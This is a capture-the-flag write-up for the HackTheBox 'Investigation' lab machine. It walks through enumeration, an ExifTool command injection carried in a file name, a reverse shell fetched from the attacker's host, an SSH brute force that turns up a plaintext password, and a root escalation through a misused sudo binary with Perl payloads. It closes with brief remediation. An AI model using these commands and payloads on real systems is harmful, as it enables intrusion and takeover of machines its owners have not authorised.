--- 
title: "HTB Investigation | Linux   Medium"
author: ""
date: 2023-05-01T20:26:26+02:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
HackTheBox Investigation is a Linux machine rated Medium and discovered to be flawed with vulnerable and outdated components(A06:2021), injection(A03:2021) and insecure design(A04:2021).

Attack Chain: The attack on this machine begins with identifying a vulnerable tool plagued with command injection. Then the attacker combed around to find a stored file that lead to the discovery of a login credential. The privilege escalation was caused by a poorly implemented binary program written in C.

#### Initialization
```bash
# connect to vpn
sudo openvpn --auth-nocache --config lab_connection.ovpn
``` 

#### Enumeration
```bash
# discover ports and services
sudo nmap --min-rate=1000 -T4 -sS -sC -sV -Pn -vvv 10.10.11.197 -oA nmap_investigation
xsltproc nmap_investigation.xml -o nmap_investigation.html             # converts xml to html
firefox nmap_investigation.html                                 # view in browser
---snip---
22/tcp open OpenSSH 8.2p1 Ubuntu 4ubuntu0.5  
80/tcp open Apache/2.4.41 (GET HEAD POST)  

# discover technologies used
whatweb 10.10.11.197      # if domain exits add to host file and rerun command
---snip---
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
RedirectLocation[http://eforenzics.htb/]

Apache[2.4.41]
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
UncommonHeaders[upgrade]

# add domain to hosts file
echo '10.10.11.197 eforenzics.htb' | sudo tee -a /etc/hosts

# investigate existing headers
curl -s -I http://eforenzics.htb/
#--snip--#
HTTP/1.1 200 OK
Date: Tue, 25 Apr 2023 07:11:38 GMT
Server: Apache/2.4.41 (Ubuntu)
Upgrade: h2
Connection: Upgrade
Last-Modified: Sat, 01 Oct 2022 00:31:36 GMT
ETag: "2acd-5e9ee3baeb4fd"
Accept-Ranges: bytes
Content-Length: 10957
Vary: Accept-Encoding
Content-Type: text/html
``` 

```shell
# discover subdomains
# with ffuf
ffuf -c -u http://eforenzics.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.eforenzics.htb' -t 50 -ac -s

# with gobuster
gobuster vhost -u http://10.10.11.197 -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt

gobuster dns -d eforenzics.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 30

# wfuzz
wfuzz -c -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://eforenzics.htb/' -H 'Host: FUZZ.stocker.htb' --sl 90 --hc '301'

```

```bash
# discover directories
# with ffuf
ffuf -c -u http://eforenzics.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -ac -s

# with gobuster
gobuster dir -u http://eforenzics.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -q
#--snip--#
/assets          301
/server-status   403

# with dirsearch
dirsearch -u http://eforenzics.htb/ -t 50 -r
200   /index.html

# with wfuzz
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt  -t 50 --hc 404 -u http://eforenzics.htb/FUZZ
#--snip--#
200    /index.html    
200    /upload.php    
200    /service.html  

# with ferobuster
feroxbuster -u  http://eforenzics.htb/ -q -E -t 30
#--snip--#
200    /assets/vendors/bootstrap/bootstrap.affix.js
200    /service.html
200    /assets/imgs/avatar2.jpg
200    /assets/imgs/avatar1.jpg
200    /assets/vendors/themify-icons/css/themify-icons.css
200    /assets/imgs/avatar3.jpg
200    /assets/vendors/bootstrap/bootstrap.bundle.js
200    /assets/vendors/jquery/jquery-3.4.1.js
200    /index.html
200    /assets/css/efore.css

```

#### Exploration
Explored the site and visited the discovered web paths.  `/upload.php` hints at image upload functionality but seems broken even when we have not uploaded any image yet. However, the `service.html` had the upload button.  Select any png or jpg image of choice and upload. The site analyses the image and returns an ExifTool report of the image's metadata. 

![Image Uploaded](/images/investigation/investigation01.png "Image Uploaded")

![Image Analyses Report](/images/investigation/investigation02.png "Image Analyses Report")

A Google search for 'exiftool 12.37 exploit' returned [this](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429) result. The idea here is to make an image with the file name ending in `|` to get a shell payload we host on the attacking machine.

#### Exploitation
```shell
# create a image with a file ending in | that will request our payload
cp dog.jpeg 'curl 10.10.14.126:8008 | bash |'

# create an index.html with the reverse shell payload
echo 'bash -i >& /dev/tcp/10.10.14.126/9009 0>&1' > index.html

# start a python server to host the index.html
python3 -m http.server 8008 -b 10.10.14.126

# now start an nc listener and upload the file
nc -lvnp 9009

# get a proper shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

# explore the system
cat /etc/passwd | grep -i 'sh$'
#--snip--#
root:x:0:0:root:/root:/bin/bash
smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash

cd /home/smorton        # permission denied
ss -tulpn               # nothing interesting
#--snip--#
Netid  State   Recv-Q   Send-Q     Local Address:Port   Peer Address:Port     Process      
udp    UNCONN    0         0       127.0.0.53%lo:53     0.0.0.0:*                     
udp    UNCONN    0         0       0.0.0.0:68           0.0.0.0:*                     
tcp    LISTEN    0        511      0.0.0.0:80           0.0.0.0:*                     
tcp    LISTEN    0        4096     127.0.0.53%lo:53     0.0.0.0:*                     
tcp    LISTEN    0        128      0.0.0.0:22           0.0.0.0:*                     
tcp    LISTEN    0        128      [::]:22              [::]:*      

# start a server on that attack's machine
python3 -m http.server 8008 -b 10.10.14.126 -d ../tools/

# upload linpeas and pspy then run them
wget http://10.10.14.126:8008/{linpeas.sh,pspy}
chmod +x linpeas.sh pspy
./linpeas.sh | tee -a linout
<<SNIP
root  955  0.0  0.0   6816  3060 ?   Ss   04:25   0:00 /usr/sbin/cron -f
root  957  0.0  0.9 235904 35984 ?   Ss   04:25   0:01 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
/var/www/uploads/1682411430 && /opt/exiftool/exiftool * > /var/www/html/analysed_images/curl1010141268008bash.txt
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*

╣ Unexpected in /opt
exiftool

╣ Interesting GROUP writable files (not in Home) (max 500)
Group www-data: /usr/local/investigation/analysed_log
SNIP

timeout 1m ./pspy   # nothing interesting ran by root

# changed to /usr/local/investigation/ and discovered 'Windows Event Logs for Analysis.msg'
cd /usr/local/investigation/
file 'Windows Event Logs for Analysis.msg'
#--snip--#
Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message

strings -e l 'Windows Event Logs for Analysis.msg' # the file had contents as shown below
<<SNIP
Windows Event Logs for Analysis
Steve Morton
00000006
/o=ExchangeLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=0355e839153a4fa590b4fd2c52a5d136-Brad Lynch
brad.lynch@pacaerocon.com.au
Hi Steve,
Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures. 
Regards
brad.lynch@pacaerocon.com.au
thomas.jones@eforenzics.htb

SMTP
thomas.jones@eforenzics.htb
From: Thomas Jones <thomas.jones@eforenzics.htb>
To: Steve Morton <steve.morton@eforenzics.htb>
Subject: Windows Event Logs for Analysis
Thread-Topic: Windows Event Logs for Analysis
Date: Tue, 16 Sept 2022 00:30:29 +0000
Accept-Language: en-US
Content-Language: en-US
Windows Event Logs for Analysis
thomas.jones@eforenzics.htb

evtx-logs.zip
steve.morton@eforenzics.htb
SNIP

# on the victim's machine
nc -q 5 -lvnp 8005 < 'Windows Event Logs for Analysis.msg'

# on the attacker's machine
tee -a forensic.msg < /dev/tcp/10.10.11.197/8005

sudo apt install evolution libemail-outlook-message-perl  # install evolution mail client and a .msg to .eml converter
msgconvert forensic.msg     # convert .msg to .eml
```

Open evolution click on 'New' attach the .eml file and 'Save as Draft'. Then click on 'Drafts' to read the contents. You can now download the evtx-logs.zip.

![Compose an Email](/images/investigation/investigation03.png "Compose an Email")

![Reading the .eml File](/images/investigation/investigation04.png "Reading the .eml File")

```shell
# extract the contents of the zip file
unzip -d evtx-logs evtx-logs.zip

# install an evtx converter. also checkout: https://github.com/williballenthin/EVTXtract
wget -O evtx_dump https://github.com/omerbenamram/evtx/releases/download/v0.8.0/evtx_dump-v0.8.0-x86_64-unknown-linux-gnu 
chmod 774 evtx_dump 

# dump the evtx to xml and jsonl
./evtx_dump -t1 evtx-logs/security.evtx -f evtx-logs/security.xml 
./evtx_dump -t1 evtx-logs/security.evtx -o jsonl -f evtx-logs/security.jsonl
codium evtx-logs

# Investigate these outputs. The TargetName appeared interesting.
grep -rne "<Data Name=\"TargetName\">" evtx-logs/security.xml 
grep -rne "TargetName" evtx-logs/security.jsonl

# create a passwordlist from name key of TargetName
cat evtx-logs/security.jsonl | jq -r '.[].EventData.TargetName' | grep -e 'name' | sed 's/.*name=\([^;]*\).*/\1/' # using a combination of grep and sed utility
cat evtx-logs/security.jsonl | jq -r '.[].EventData.TargetName' | grep -oP '(?<=name=)[^;]*' | uniq | tee -a TNpasslist   # using only grep to generate a password list
hydra -l smorton -P TNpasslist -t 6 -q ssh://10.10.11.197    # ssh brute force

# create a passwordlist from TargetUserName. I wasn't expecting to find something but did
cat evtx-logs/security.jsonl | jq -r '.[].EventData.TargetUserName' | sort -u > TUNpasslist.txt
hydra -l smorton -P TUNpasslist.txt -t 6 -q ssh://10.10.11.197    # ssh brute force
#--snip--#
[DATA] attacking ssh://10.10.11.197:22/
[22][ssh] host: 10.10.11.197   login: smorton   password: Def@ultf0r3nz!csPa$$

# login into the machine
ssh smorton@10.10.11.197   # submit password on prompt:Def@ultf0r3nz!csPa$$
ls -lah
#--snip--#
-rwxrwx--- 1 smorton smorton  220 Feb 25  2020 .bash_logout
-rwxrwx--- 1 smorton smorton 3.7K Feb 25  2020 .bashrc
drwxrwx--- 2 smorton smorton 4.0K Aug 27  2022 .cache
-rwxrwx--- 1 smorton smorton  807 Feb 25  2020 .profile
-rw-r----- 1 root    smorton   33 Apr 25 04:25 user.txt

cat user.txt               # capture the user flag
```

#### Escalation
```shell
sudo -l                     # list allowed commands user can run
#--snip--#
User smorton may run the following commands on investigation:
 (root) NOPASSWD: /usr/bin/binary

sudo /usr/bin/binary
#--snip--#
Exiting... 

# download the binary for reverse engineering
nc -q 5 -lvnp 8005 < /usr/bin/binary         # on the victim's machine

tee -a binary < /dev/tcp/10.10.11.197/8005   # on the attacker's machine

# analysing the binary
file binary    # display the binary file details
#--snip--#
binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a703575c5c944bfcfea8a04f0aabaf0b4fa9f7cb, for GNU/Linux 3.2.0, not stripped

objdump -d -M att binary  | sed -n '/<_init>:\|<_start>:/,/^$/p'  # display the binary file assembly information
<<SNIP
0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    1004:	48 83 ec 08          	sub    $0x8,%rsp
    1008:	48 8b 05 d9 2f 00 00 	mov    0x2fd9(%rip),%rax        # 3fe8 <__gmon_start__>
    100f:	48 85 c0             	test   %rax,%rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   *%rax
    1016:	48 83 c4 08          	add    $0x8,%rsp
    101a:	c3                   	ret    

0000000000001200 <_start>:
    1200:	f3 0f 1e fa          	endbr64 
    1204:	31 ed                	xor    %ebp,%ebp
    1206:	49 89 d1             	mov    %rdx,%r9
    1209:	5e                   	pop    %rsi
    120a:	48 89 e2             	mov    %rsp,%rdx
    120d:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    1211:	50                   	push   %rax
    1212:	54                   	push   %rsp
    1213:	4c 8d 05 f6 04 00 00 	lea    0x4f6(%rip),%r8     # 1710 <__libc_csu_fini>
    121a:	48 8d 0d 7f 04 00 00 	lea    0x47f(%rip),%rcx    # 16a0 <__libc_csu_init>
    1221:	48 8d 3d 0b 02 00 00 	lea    0x20b(%rip),%rdi    # 1433 <main>
    1228:	ff 15 c2 2d 00 00    	call   *0x2dc2(%rip)       # 3ff0 <__libc_start_main@GLIBC_2.2.5>
    122e:	f4                   	hlt    
    122f:	90                   	nop

SNIP

objdump -d -j .text -M att binary | sed -n '/<main>:/,/^$/p'    # display details of the main block of the binary file
<<SNIP
0000000000001433 <main>:
    1433:	f3 0f 1e fa          	endbr64 
    1437:	55                   	push   %rbp
    1438:	48 89 e5             	mov    %rsp,%rbp
    143b:	48 83 ec 50          	sub    $0x50,%rsp
    143f:	89 7d bc             	mov    %edi,-0x44(%rbp)
    1442:	48 89 75 b0          	mov    %rsi,-0x50(%rbp)
    1446:	83 7d bc 03          	cmpl   $0x3,-0x44(%rbp)
    144a:	74 16                	je     1462 <main+0x2f>
    144c:	48 8d 3d b1 0b 00 00 	lea    0xbb1(%rip),%rdi        # 2004 <_IO_stdin_used+0x4>
    1453:	e8 58 fd ff ff       	call   11b0 <puts@plt>
    1458:	bf 00 00 00 00       	mov    $0x0,%edi
    145d:	e8 1e fd ff ff       	call   1180 <exit@plt>
    1462:	e8 d9 fc ff ff       	call   1140 <getuid@plt>
    1467:	85 c0                	test   %eax,%eax
    1469:	74 16                	je     1481 <main+0x4e>
    146b:	48 8d 3d 92 0b 00 00 	lea    0xb92(%rip),%rdi        # 2004 <_IO_stdin_used+0x4>
    1472:	e8 39 fd ff ff       	call   11b0 <puts@plt>
    1477:	bf 00 00 00 00       	mov    $0x0,%edi
    147c:	e8 ff fc ff ff       	call   1180 <exit@plt>
    1481:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1485:	48 83 c0 10          	add    $0x10,%rax
    1489:	48 8b 00             	mov    (%rax),%rax
    148c:	48 8d 35 7d 0b 00 00 	lea    0xb7d(%rip),%rsi        # 2010 <_IO_stdin_used+0x10>
    1493:	48 89 c7             	mov    %rax,%rdi
    1496:	e8 f5 fc ff ff       	call   1190 <strcmp@plt>
    149b:	85 c0                	test   %eax,%eax
    149d:	0f 85 dd 01 00 00    	jne    1680 <main+0x24d>
    14a3:	48 8d 3d 71 0b 00 00 	lea    0xb71(%rip),%rdi        # 201b <_IO_stdin_used+0x1b>
    14aa:	e8 01 fd ff ff       	call   11b0 <puts@plt>
    14af:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    14b3:	48 83 c0 10          	add    $0x10,%rax
    14b7:	48 8b 00             	mov    (%rax),%rax
    14ba:	48 8d 35 66 0b 00 00 	lea    0xb66(%rip),%rsi        # 2027 <_IO_stdin_used+0x27>
    14c1:	48 89 c7             	mov    %rax,%rdi
    14c4:	e8 17 fd ff ff       	call   11e0 <fopen@plt>
    14c9:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    14cd:	e8 ee fc ff ff       	call   11c0 <curl_easy_init@plt>
    14d2:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    14d6:	c7 45 c8 12 27 00 00 	movl   $0x2712,-0x38(%rbp)
    14dd:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    14e1:	48 83 c0 08          	add    $0x8,%rax
    14e5:	48 8b 10             	mov    (%rax),%rdx
    14e8:	8b 4d c8             	mov    -0x38(%rbp),%ecx
    14eb:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    14ef:	89 ce                	mov    %ecx,%esi
    14f1:	48 89 c7             	mov    %rax,%rdi
    14f4:	b8 00 00 00 00       	mov    $0x0,%eax
    14f9:	e8 32 fc ff ff       	call   1130 <curl_easy_setopt@plt>
    14fe:	c7 45 cc 11 27 00 00 	movl   $0x2711,-0x34(%rbp)
    1505:	8b 4d cc             	mov    -0x34(%rbp),%ecx
    1508:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    150c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1510:	89 ce                	mov    %ecx,%esi
    1512:	48 89 c7             	mov    %rax,%rdi
    1515:	b8 00 00 00 00       	mov    $0x0,%eax
    151a:	e8 11 fc ff ff       	call   1130 <curl_easy_setopt@plt>
    151f:	c7 45 d0 2d 00 00 00 	movl   $0x2d,-0x30(%rbp)
    1526:	8b 4d d0             	mov    -0x30(%rbp),%ecx
    1529:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    152d:	ba 01 00 00 00       	mov    $0x1,%edx
    1532:	89 ce                	mov    %ecx,%esi
    1534:	48 89 c7             	mov    %rax,%rdi
    1537:	b8 00 00 00 00       	mov    $0x0,%eax
    153c:	e8 ef fb ff ff       	call   1130 <curl_easy_setopt@plt>
    1541:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1545:	48 89 c7             	mov    %rax,%rdi
    1548:	e8 23 fc ff ff       	call   1170 <curl_easy_perform@plt>
    154d:	89 45 d4             	mov    %eax,-0x2c(%rbp)
    1550:	83 7d d4 00          	cmpl   $0x0,-0x2c(%rbp)
    1554:	0f 85 10 01 00 00    	jne    166a <main+0x237>
    155a:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    155e:	48 83 c0 10          	add    $0x10,%rax
    1562:	48 8b 00             	mov    (%rax),%rax
    1565:	48 89 c1             	mov    %rax,%rcx
    1568:	48 8d 15 bb 0a 00 00 	lea    0xabb(%rip),%rdx        # 202a <_IO_stdin_used+0x2a>
    156f:	be 00 00 00 00       	mov    $0x0,%esi
    1574:	bf 00 00 00 00       	mov    $0x0,%edi
    1579:	b8 00 00 00 00       	mov    $0x0,%eax
    157e:	e8 dd fb ff ff       	call   1160 <snprintf@plt>
    1583:	48 98                	cltq   
    1585:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    1589:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    158d:	48 83 c0 01          	add    $0x1,%rax
    1591:	48 89 c7             	mov    %rax,%rdi
    1594:	e8 07 fc ff ff       	call   11a0 <malloc@plt>
    1599:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    159d:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    15a1:	48 83 c0 10          	add    $0x10,%rax
    15a5:	48 8b 10             	mov    (%rax),%rdx
    15a8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    15ac:	48 8d 70 01          	lea    0x1(%rax),%rsi
    15b0:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    15b4:	48 89 d1             	mov    %rdx,%rcx
    15b7:	48 8d 15 6c 0a 00 00 	lea    0xa6c(%rip),%rdx        # 202a <_IO_stdin_used+0x2a>
    15be:	48 89 c7             	mov    %rax,%rdi
    15c1:	b8 00 00 00 00       	mov    $0x0,%eax
    15c6:	e8 95 fb ff ff       	call   1160 <snprintf@plt>
    15cb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    15cf:	48 89 c1             	mov    %rax,%rcx
    15d2:	48 8d 15 54 0a 00 00 	lea    0xa54(%rip),%rdx        # 202d <_IO_stdin_used+0x2d>
    15d9:	be 00 00 00 00       	mov    $0x0,%esi
    15de:	bf 00 00 00 00       	mov    $0x0,%edi
    15e3:	b8 00 00 00 00       	mov    $0x0,%eax
    15e8:	e8 73 fb ff ff       	call   1160 <snprintf@plt>
    15ed:	48 98                	cltq   
    15ef:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    15f3:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    15f7:	48 83 c0 01          	add    $0x1,%rax
    15fb:	48 89 c7             	mov    %rax,%rdi
    15fe:	e8 9d fb ff ff       	call   11a0 <malloc@plt>
    1603:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1607:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    160b:	48 8d 70 01          	lea    0x1(%rax),%rsi
    160f:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    1613:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1617:	48 89 d1             	mov    %rdx,%rcx
    161a:	48 8d 15 0c 0a 00 00 	lea    0xa0c(%rip),%rdx        # 202d <_IO_stdin_used+0x2d>
    1621:	48 89 c7             	mov    %rax,%rdi
    1624:	b8 00 00 00 00       	mov    $0x0,%eax
    1629:	e8 32 fb ff ff       	call   1160 <snprintf@plt>
    162e:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1632:	48 89 c7             	mov    %rax,%rdi
    1635:	e8 16 fb ff ff       	call   1150 <fclose@plt>
    163a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    163e:	48 89 c7             	mov    %rax,%rdi
    1641:	e8 da fa ff ff       	call   1120 <curl_easy_cleanup@plt>
    1646:	bf 00 00 00 00       	mov    $0x0,%edi
    164b:	e8 80 fb ff ff       	call   11d0 <setuid@plt>
    1650:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1654:	48 89 c7             	mov    %rax,%rdi
    1657:	e8 94 fb ff ff       	call   11f0 <system@plt>
    165c:	48 8d 3d d4 09 00 00 	lea    0x9d4(%rip),%rdi        # 2037 <_IO_stdin_used+0x37>
    1663:	e8 88 fb ff ff       	call   11f0 <system@plt>
    1668:	eb 2c                	jmp    1696 <main+0x263>
    166a:	48 8d 3d 93 09 00 00 	lea    0x993(%rip),%rdi        # 2004 <_IO_stdin_used+0x4>
    1671:	e8 3a fb ff ff       	call   11b0 <puts@plt>
    1676:	bf 00 00 00 00       	mov    $0x0,%edi
    167b:	e8 00 fb ff ff       	call   1180 <exit@plt>
    1680:	48 8d 3d 7d 09 00 00 	lea    0x97d(%rip),%rdi        # 2004 <_IO_stdin_used+0x4>
    1687:	e8 24 fb ff ff       	call   11b0 <puts@plt>
    168c:	bf 00 00 00 00       	mov    $0x0,%edi
    1691:	e8 ea fa ff ff       	call   1180 <exit@plt>
    1696:	b8 00 00 00 00       	mov    $0x0,%eax
    169b:	c9                   	leave  
    169c:	c3                   	ret    
    169d:	0f 1f 00             	nopl   (%rax)

SNIP

ghidra    # open with ghidra for cleaner analysis and source reverse engineering
```
Click 'New Project' -> Select 'Non-Shared Project' -> Enter a project Name -> Click 'Finish'. Navigate to File and Click 'Import File...' to import the binary.  Double-click the filename and Click 'Yes' and 'Analyze' to start analyzing.
![Create a Ghidra Project](/images/investigation/investigation05.png "Create a Ghidra Project")
Now on the left pane Double Click on 'Functions' from the 'Symbol Tree' section, then locate and Click 'main'.
![Import the Binary](/images/investigation/investigation06.png "Import the Binary")
This is a C code whose main function takes in two parameters, an integer "param_1" and a long "param_2". The program exits if "param_1" is not equal to 3, the user's UID (obtained using the getuid() function) is not equal to 0, or the value at memory location "param_2 + 0x10" is not equal to "lDnxUysaQn". If all the checks pass, the program runs the command "curl_easy_perform(uVar3)" which opens the specified URL resource and runs it using 'perl' before deleting it.
[decompiled binary](#)
```c
undefined8 main(int param_1,long param_2)

{
  __uid_t _Var1;
  int iVar2;
  FILE *__stream;
  undefined8 uVar3;
  char *__s;
  char *__s_00;
  
  if (param_1 != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _Var1 = getuid();
  if (_Var1 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
  if (iVar2 != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Running... ");
  __stream = fopen(*(char **)(param_2 + 0x10),"wb");
  uVar3 = curl_easy_init();
  curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
  curl_easy_setopt(uVar3,0x2711,__stream);
  curl_easy_setopt(uVar3,0x2d,1);
  iVar2 = curl_easy_perform(uVar3);
  if (iVar2 == 0) {
    iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
    __s = (char *)malloc((long)iVar2 + 1);
    snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
    iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
    __s_00 = (char *)malloc((long)iVar2 + 1);
    snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
    fclose(__stream);
    curl_easy_cleanup(uVar3);
    setuid(0);
    system(__s_00);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
A detailed look at the code:
1. Terminate execution if the program's arguments is not equal to three, the user running the binary is not root, and the param_2 value does not equal 'lDnxUysaQn'
2. Open with "fopen" function, a file at memory location "param_2 + 0x10" in "wb" (write in binary) mode and assign the resulting file stream to `__stream`.
3.  Initializes a cURL session using "curl_easy_init()" and assign the resulting handle to the variable "uVar3".  Set the cURL options "CURLOPT_URL" to the value at memory location "param_2 + 8" using `curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8))`, "CURLOPT_WRITEDATA" to the file stream `__stream` using `curl_easy_setopt(uVar3,0x2711,__stream)`, "CURLOPT_FOLLOWLOCATION" to 1 using `curl_easy_setopt(uVar3,0x2d,1)` and performs the cURL session using `curl_easy_perform(uVar3)` and assign the return code to the variable "iVar2".
4.  If the code is 0, indicating success, it uses `snprintf` to write the filename at memory location "param_2 + 0x10" to a null-terminated string, allocating memory for the string (`__s`) using `malloc` and the command to execute `perl ./filename`  to another null-terminated string, allocating memory for the string (`__s_00`) using malloc.
5. Closes the file stream using `fclose(__stream)`, cleans up the cURL session using `curl_easy_cleanup(uVar3)`, sets the user ID to 0 using `setuid(0)`, runs the commands "perl ./filename" using `system(__s_00)` and "rm -f ./lDnxUysaQn" using `system("rm -f ./lDnxUysaQn")` to delete the file and finally returns 0. If the return code is not 0, indicating failure, it prints the message "Exiting... " and terminates the program.
```shell
# start a horizontally spiltted terminal and ssh into the box on both of them.
# terminal one
python3 -m http.server 8004 # start a python server

# terminal two
# Technique 1
echo -e '`chmod 6711 /usr/bin/bash`' > escalate.pl   
sudo binary http://127.0.0.1:8004/escalate.pl lDnxUysaQn
bash -p

# Technique 2
printf 'exec "/bin/bash";\n' > root.pl  
sudo binary http://127.0.0.1:8004/root.pl lDnxUysaQn

cat /root/root.txt  # capture the root flag
```
![Rooted](/images/investigation/investigation07.png "Rooted")

#### Exfiltration
Let's exfiltrate the source code and investigate the flaws of the code.
```shell
sudo su -s /bin/bash www-data    # switch to www-data
wget -r -np -k -p -nH -P source http://10.10.11.197:8000/ # download the source code 
cd source/html
curl -s -o upload.php http://10.10.11.197:8000/upload.php
codium source
```

#### Remediation
**Fixing the Foothold Vector**  
Staying in the context of the app we will just upgrade the ExifTool to the patched version.
```shell
# on the attacker's machine
wget https://github.com/exiftool/exiftool/archive/refs/tags/12.55.zip; unzip 12.55.zip
cd exiftool-12.55
./exiftool -ver      # check the version
./exiftool -htmlDump > exiftool.1   # generate a man page
man ./exiftool.1      # view the man page
sudo install -m 644 exiftool.1 /usr/share/man/man1/   # install at common man location

# on the victim's machine
wget http://http://10.10.11.197:8000/exiftool
/opt/exiftool/exiftool -ver    # returns 12.37
sudo mv /opt/exiftool/exiftool /usr/bin/exiftool.bak
sudo mv ./exiftool /opt/exiftool/exiftool
```

**Fixing the Privilege Escalation Vector**  
I am not sure there would be a realistic scenario where such binary is coded for use in a system. I am not an expert yet in binary reverse engineering and remediation. I however included lots of resources herein for further consultations. 
#### References
[Binary Reverse Engineering - Pwn College](https://pwn.college/modules/reversing.html), [Reverse Engineering Pwn College Youtube](https://www.youtube.com/playlist?list=PL-ymxv0nOtqrGVyPIpJeostmi7zW5JS5l), [Introduction to Reverse Engineering - objdump and onlinedisassembler.com - Paladin Group, LLC](https://www.youtube.com/watch?v=2dx01MRav44), [Functions - Perl Doc](https://perldoc.perl.org/functions), [How to Run a Shell Script from a Perl Program - Stackoverflow](https://stackoverflow.com/questions/3200801/how-can-i-call-a-shell-command-in-my-perl-script/3200810#3200810), [cURL setopt - Louisiana University](https://ld2015.scusa.lsu.edu/php/function.curl-setopt.html), [Pwn Zero To Hero](https://www.youtube.com/playlist?list=PLeSXUd883dhjmKkVXSRgI1nJEZUDzgLf_)


>I build secure and reliable infrastructures, hunt for flaws in insecure systems and remediate them to meet compliance. Book a consultation [session](https://calendly.com/samuelnwoye/10min).